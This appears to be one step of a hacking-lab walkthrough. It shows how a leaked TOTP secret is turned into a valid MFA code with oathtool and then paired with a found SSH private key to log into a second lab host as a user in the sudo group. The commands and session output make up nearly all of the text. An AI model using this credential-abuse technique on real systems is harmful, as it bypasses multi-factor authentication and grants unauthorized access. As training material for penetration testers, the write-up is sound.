# Abuse Leaked OTP Secret

Calculate the OTP either by enrolling the MFA OTP code in your favourite OTP app via the provided QR code, or use the following command:

```shell-session
root@linux-srv-06:/opt/temporary-remote-access# oathtool --base32 --totp 4BBUGHWJT5DVOUFKH5FVAJHUWA
830051
```

Use the OTP and the private key to perform a login:

```shell-session
root@linux-srv-06:/opt/temporary-remote-access# ssh -v -i id_ed25519 frank@linux-srv-07
[...]
debug1: Will attempt key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
debug1: Offering public key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
debug1: Server accepts key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
Authenticated using "publickey" with partial success.
debug1: Authentications that can continue: keyboard-interactive
debug1: Next authentication method: keyboard-interactive
(frank@linux-srv-07) Verification code: 
Authenticated to linux-srv-07 ([10.5.23.17]:22) using "keyboard-interactive".
[...]

  ###############################################################
  #                                                             #
  # Welcome to                                                  #
  #  _ _                                            ___ _____   #
  # | (_)_ __  _   ___  __     ___ _ ____   __     / _ \___  |  #
  # | | | '_ \| | | \ \/ /____/ __| '__\ \ / /____| | | | / /   #
  # | | | | | | |_| |>  <_____\__ \ |   \ V /_____| |_| |/ /    #
  # |_|_|_| |_|\__,_/_/\_\    |___/_|    \_/       \___//_/     #
  #                                                             #
  #                                                             #
  ###############################################################
  #                                                             #
  #                 \o/  Happy Hacking  ;-)                     #
  #                                                             #
  ###############################################################



frank@linux-srv-07:~$ hostname
linux-srv-07.nullbyte.internal

frank@linux-srv-07:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
```

